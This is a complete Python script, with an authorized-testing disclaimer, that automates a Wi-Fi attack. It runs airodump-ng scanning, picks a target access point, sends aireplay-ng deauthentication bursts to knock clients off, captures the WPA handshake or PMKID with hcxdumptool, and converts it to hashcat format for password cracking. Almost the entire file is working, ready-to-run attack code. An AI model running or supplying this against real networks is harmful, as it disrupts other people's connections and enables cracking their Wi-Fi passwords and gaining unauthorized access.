# DISCLAIMER:
# This script is for educational and authorized penetration testing purposes only.
# Use only on networks you own or have explicit permission to test.
# Unauthorized use may violate local, state, or federal laws.
# The author is not responsible for misuse.

#Requirements:
#Linux (sudo privileged), aircrack-ng, hcxdumptool, hcxpcapngtool
#Wifi adapter that support monitor mode, packet injection and linux compatibility

import subprocess as sp #subprocess is a built-in module to interact with the terminal on linux
from datetime import datetime
import time, os, tempfile, signal, argparse, shutil

def _run(cmd, **kwargs):
    return sp.run(cmd, **kwargs)

def _popen(cmd, **kwargs):
    return sp.Popen(cmd, **kwargs)

def _exists(cmd):
    return shutil.which(cmd) is not None

def _sanitize_bssid(bssid: str) -> str:
    return bssid.strip().upper().replace(":", "")

"""
_run(cmd, **kwargs)
A wrapper around subprocess.run() that runs a shell command (cmd) and waits for it to finish. Returns the CompletedProcess object.

_popen(cmd, **kwargs)
A wrapper around subprocess.Popen() that starts a process (cmd) but does not wait for it to finish, letting it run in the background. Returns the Popen object.

_exists(cmd)
Checks if a given command (cmd) exists in the system's PATH using shutil.which(). Returns True if found, otherwise False.

_sanitize_bssid(bssid)
Takes a BSSID (MAC address), strips spaces, converts it to uppercase, and removes all colons. This makes it safe to use in filenames or tags.
"""

class HandshakeRunner:
    # Constructor method
    def __init__(self, iface="wlan0mon", base_iface="wlan0", prefix="capture",
                 frames=5, wait=90, retry_wait=60, pmkid_seconds=30,
                 pcapng_seconds=None, pcapng_analyze=False):
        
        self.iface = iface # wifi interface in monitor mode
        self.base_iface = base_iface # wifi interface in managed mode
        self.prefix = prefix 
        self.frames = str(frames) # how many frames to send in a burst for deauth attack
        self.wait = int(wait) # how many seconds to wait after first deauth
        self.retry_wait = int(retry_wait)
        self.pmkid_seconds = int(pmkid_seconds) # how many seconds to capture for PMKID
        self.pcapng_seconds = int(pcapng_seconds) if pcapng_seconds else None
        self.pcapng_analyze = bool(pcapng_analyze)

    def cap_to_22000(self, cap_path, out_prefix=None):
        '''
        Convert handshake capture file from .cap to 22000 format
        '''
        out_file = f"{(out_prefix or self.prefix)}.22000"
        _run(["hcxpcapngtool", cap_path, "-o", out_file], check=False)
        print(f"[+] Converted to {out_file}")

    def aircrack_has_handshake(self, cap_path):
        """
        Check if aircrack-ng can find a valid WPA handshake in the capture file.
        """
        out = _run(["aircrack-ng", cap_path, "-a", "2", "-w", "/dev/null"],
                   capture_output=True, text=True)
        print(out.stdout)
        return "No valid WPA handshakes found" not in out.stdout

    def targeted_pmkid(self, bssid, channel, seconds=None):
        """
        Capture PMKID for a specific BSSID and channel.
        """
        seconds = int(seconds or self.pmkid_seconds)
        print("[*] Trying targeted PMKID capture...")

        # lock to the AP's channel
        _run(["iw", "dev", self.iface, "set", "channel", str(channel)], check=False)

        # filterlist for the exact BSSID
        with tempfile.NamedTemporaryFile("w", delete=False) as f:
            f.write(bssid.strip().upper() + "\n")
            fl_path = f.name

        tag = _sanitize_bssid(bssid)
        pmkid_pcapng = f"pmkid_{tag}.pcapng"
        pmkid_22000  = f"pmkid_{tag}.22000"

        try:
            proc = _popen([
                "hcxdumptool",
                "-i", self.iface,
                "--filterlist", fl_path, "--filtermode=2",
                "--enable_status=15",
                "-o", pmkid_pcapng
            ])
            print(f"[*] Capturing PMKID for ~{seconds}s... (Ctrl+C to stop early)")
            try:
                time.sleep(seconds)
            except KeyboardInterrupt:
                print("\n[!] Interrupted; stopping PMKID capture early...")
            finally:
                try:
                    proc.send_signal(signal.SIGINT)
                    proc.wait(timeout=3)
                except Exception:
                    proc.terminate()

            _run(["hcxpcapngtool", pmkid_pcapng, "-o", pmkid_22000], check=False)
            print(f"[+] PMKID capture attempt finished. Check {pmkid_22000}.")
        finally:
            try:
                os.unlink(fl_path)
            except Exception:
                pass

    def start_pcapng_capture(self, bssid_tag, channel):
        '''
        Start pcapng capture, use for later analysis, not crucial for cracking in hashcat.
        '''
        if self.pcapng_seconds is None:
            return None, None

        # Prefer dumpcap, fallback to tshark
        cmd = None
        tool = None
        if _exists("dumpcap"):
            tool = "dumpcap"
            cmd = [tool, "-I", "-i", self.iface, "-w"]
        elif _exists("tshark"):
            tool = "tshark"
            cmd = [tool, "-I", "-i", self.iface, "-w"]
        else:
            print("[!] Neither dumpcap nor tshark found; skipping pcapng capture.")
            return None, None

        # Lock channel for cleaner analysis
        _run(["iw", "dev", self.iface, "set", "channel", str(channel)], check=False)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        pcapng_file = f"{self.prefix}_{bssid_tag}_{ts}.pcapng"
        print(f"[*] Starting {tool} radiotap pcapng capture to {pcapng_file} for ~{self.pcapng_seconds}s...")
        proc = _popen(cmd + [pcapng_file])
        return proc, pcapng_file

    def stop_proc(self, proc):
        '''
        Stop pcapng capture process.
        '''
        if not proc:
            return
        try:
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass

    def analyze_pcapng(self, pcapng_file, bssid):
        '''
        Analyze pcapng capture to CSVs (EAPOL, Beacons/PMF, Signal over time).
        '''
        if not self.pcapng_analyze or not pcapng_file:
            return
        if not _exists("tshark"):
            print("[!] tshark not found; skipping pcapng analysis CSV.")
            return

        tag = _sanitize_bssid(bssid)
        base = os.path.splitext(pcapng_file)[0]
        eapol_csv   = f"{base}_eapol.csv"
        beacon_csv  = f"{base}_beacons.csv"
        signal_csv  = f"{base}_signal.csv"

        print("[*] Analyzing pcapng → CSVs (EAPOL, Beacons/PMF, Signal over time)...")

        # 1) EAPOL frames timeline
        with open(eapol_csv, "w") as f:
            # Header
            f.write("frame,time_rel,src,dst,info\n")
            # Use _ws.col.Info to get M1/M2 etc description in many tshark builds
            cmd = ["tshark", "-r", pcapng_file, "-Y", "eapol",
                   "-T", "fields",
                   "-e", "frame.number", "-e", "frame.time_relative",
                   "-e", "wlan.sa", "-e", "wlan.da",
                   "-e", "_ws.col.Info"]
            out = _run(cmd, capture_output=True, text=True)
            if out.stdout:
                for line in out.stdout.strip().splitlines():
                    cols = line.split("\t")
                    f.write(",".join([c.replace(",", ";") for c in cols]) + "\n")

        # 2) Beacon RSN/PMF flags + AKM types
        with open(beacon_csv, "w") as f:
            f.write("ssid,mfp_capable,mfpr,akm_type,channel\n")
            cmd = ["tshark", "-r", pcapng_file,
                   "-Y", "wlan.fc.type_subtype==8 && wlan_mgt.ssid",
                   "-T", "fields",
                   "-e", "wlan_mgt.ssid",
                   "-e", "wlan.rsn.capabilities.mfp_capable",
                   "-e", "wlan.rsn.capabilities.mfpr",
                   "-e", "wlan.rsn.akms.type",
                   "-e", "wlan_radio.channel"]
            out = _run(cmd, capture_output=True, text=True)
            if out.stdout:
                for line in out.stdout.strip().splitlines():
                    cols = line.split("\t")
                    f.write(",".join([c.replace(",", ";") for c in cols]) + "\n")

        # 3) Signal (AP beacons) over time
        with open(signal_csv, "w") as f:
            f.write("time_rel,src,signal_dbm\n")
            # Prefer wlan_radio.signal_dbm but fallback to radiotap.dbm_antsignal if needed
            cmd = ["tshark", "-r", pcapng_file,
                   "-Y", f"wlan.fc.type_subtype==8 && wlan_mgt.ssid",
                   "-T", "fields",
                   "-e", "frame.time_relative",
                   "-e", "wlan.sa",
                   "-e", "wlan_radio.signal_dbm"]
            out = _run(cmd, capture_output=True, text=True)
            if not out.stdout or out.stdout.strip() == "":
                cmd = ["tshark", "-r", pcapng_file,
                       "-Y", f"wlan.fc.type_subtype==8 && wlan_mgt.ssid",
                       "-T", "fields",
                       "-e", "frame.time_relative",
                       "-e", "wlan.sa",
                       "-e", "radiotap.dbm_antsignal"]
                out = _run(cmd, capture_output=True, text=True)
            if out.stdout:
                for line in out.stdout.strip().splitlines():
                    cols = line.split("\t")
                    f.write(",".join([c.replace(",", ";") for c in cols]) + "\n")

        print(f"[+] Wrote: {eapol_csv}, {beacon_csv}, {signal_csv}")

    # --- main flow ---
    def run(self):
        '''
        Run the handshake capture flow: monitor proximity network > pick a target > deauth attack > wait for reconnect > capture 4 ways handshake.
        '''
        print("Putting wlan0 into monitor mode...")
        _run(["airmon-ng", "start", self.base_iface], check=False)

        print("Killing interfering services...")
        _run(["airmon-ng", "check", "kill"], check=False)

        try:
            choice = input("Start monitoring? \n1. Yes \n2. No (exit)\n> ").strip()
            if choice != "1":
                print("Aborted by user.")
                return

            print("Monitoring..... (press ENTER when you've identified a target)")
            prescan = _popen(["airodump-ng", self.iface])
            try:
                input()
            finally:
                prescan.terminate()
                try:
                    prescan.wait(timeout=3)
                except sp.TimeoutExpired:
                    prescan.kill()

            print("Please enter target info:")
            bssid   = input("Enter AP BSSID (e.g., 02:83:CC:B3:FD:2B): ").strip()
            channel = input("Enter AP channel (e.g., 6): ").strip()
            client  = input("Enter Client MAC (optional; Enter to hit all): ").strip()
            frames  = self.frames  # smaller burst to avoid AP timer resets
            tag     = _sanitize_bssid(bssid)

            print("Locking targeted channel...")
            _run(["iw", "dev", self.iface, "set", "channel", channel], check=False)

            # Optional pcapng capture (radiotap) in parallel
            pcapng_proc = None
            pcapng_file = None
            if self.pcapng_seconds:
                pcapng_proc, pcapng_file = self.start_pcapng_capture(tag, channel)

            print("Starting targeted capture (airodump-ng)...")
            cap_proc = _popen([
                "airodump-ng", "--bssid", bssid, "--channel", channel,
                "-w", self.prefix, self.iface
            ])

            try:
                time.sleep(2)
                print("Sending deauth burst...")
                print("________________________________________\n"
                      " If the AP enforces 802.11w/PMF (often WPA3), deauth may be ignored.\n"
                      " In that case, use PMKID or wait for a natural reconnect.\n"
                      "________________________________________")
                deauth_cmd = ["aireplay-ng", "--deauth", frames, "-a", bssid, "--ignore-negative-one"]
                if client:
                    deauth_cmd += ["-c", client]
                deauth_cmd += [self.iface]
                _run(deauth_cmd, check=False)

                print(f"Waiting up to {self.wait}s for reconnect/handshake...")
                time.sleep(self.wait)

            finally:
                print("Stopping airodump-ng capture...")
                cap_proc.terminate()
                try:
                    cap_proc.wait(timeout=3)
                except sp.TimeoutExpired:
                    cap_proc.kill()

                # Stop pcapng capture if allotted time has passed
                if pcapng_proc:
                    # If the pcapng_seconds has not elapsed yet, give it the remaining time
                    print("Stopping pcapng capture...")
                    self.stop_proc(pcapng_proc)

            cap_file = os.path.abspath(f"{self.prefix}-01.cap")
            print(f"[+] Checking for handshake in {cap_file} ...")

            # check, retry once, then PMKID
            if os.path.exists(cap_file) and self.aircrack_has_handshake(cap_file):
                print("[+] Handshake likely present. Converting to .22000...")
                self.cap_to_22000(cap_file, out_prefix=f"{self.prefix}")
            else:
                print(f"[!] No valid handshake. Retrying once ({self.frames} frames) and waiting {self.retry_wait}s...")
                _run(["aireplay-ng", "--deauth", self.frames, "-a", bssid, "--ignore-negative-one", self.iface], check=False)
                time.sleep(self.retry_wait)

                if os.path.exists(cap_file) and self.aircrack_has_handshake(cap_file):
                    print("[+] Handshake found on retry. Converting to .22000...")
                    self.cap_to_22000(cap_file, out_prefix=f"{self.prefix}")
                else:
                    print("[!] Still no valid handshake, switching to targeted PMKID...")
                    self.targeted_pmkid(bssid=bssid, channel=channel, seconds=self.pmkid_seconds)

            # Convert pcapng (if we captured it) and optionally analyze
            if pcapng_file and os.path.exists(pcapng_file):
                print(f"[*] Converting pcapng to 22000 as well (optional artifact)...")
                out_pref = os.path.splitext(pcapng_file)[0]
                _run(["hcxpcapngtool", pcapng_file, "-o", f"{out_pref}.22000"], check=False)
                if self.pcapng_analyze:
                    self.analyze_pcapng(pcapng_file, bssid)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")

        finally:
            print("Restoring normal Wi-Fi settings...")
            _run(["airmon-ng", "stop", self.iface], check=False)
            _run(["systemctl", "restart", "NetworkManager"], check=False)


def parse_args():
    '''
    Parse command line arguments.
    '''
    ap = argparse.ArgumentParser(description="Handshake-first capture with optional pcapng analysis and PMKID fallback.")
    ap.add_argument("--iface", default="wlan0mon", help="Monitor interface to use (default: wlan0mon)")
    ap.add_argument("--base-iface", default="wlan0", help="Base interface to put into monitor mode (default: wlan0)")
    ap.add_argument("--prefix", default="capture", help="Output prefix for airodump/hcx tools (default: capture)")
    ap.add_argument("--frames", type=int, default=5, help="Deauth frames per burst (default: 5)")
    ap.add_argument("--wait", type=int, default=90, help="Seconds to wait after first deauth (default: 90)")
    ap.add_argument("--retry-wait", type=int, default=60, help="Seconds to wait after retry burst (default: 60)")
    ap.add_argument("--pmkid-seconds", type=int, default=30, help="Seconds to run targeted PMKID capture (default: 30)")
    ap.add_argument("--pcapng", type=int, default=None, help="If set, also capture radiotap pcapng for N seconds in parallel")
    ap.add_argument("--pcapng-analyze", action="store_true", help="If set, create CSV analyses from the pcapng (requires tshark)")
    return ap.parse_args()

if __name__ == "__main__":
    args = parse_args()
    runner = HandshakeRunner(
        iface=args.iface,
        base_iface=args.base_iface,
        prefix=args.prefix,
        frames=args.frames,
        wait=args.wait,
        retry_wait=args.retry_wait,
        pmkid_seconds=args.pmkid_seconds,
        pcapng_seconds=args.pcapng,
        pcapng_analyze=args.pcapng_analyze,
    )
    runner.run()
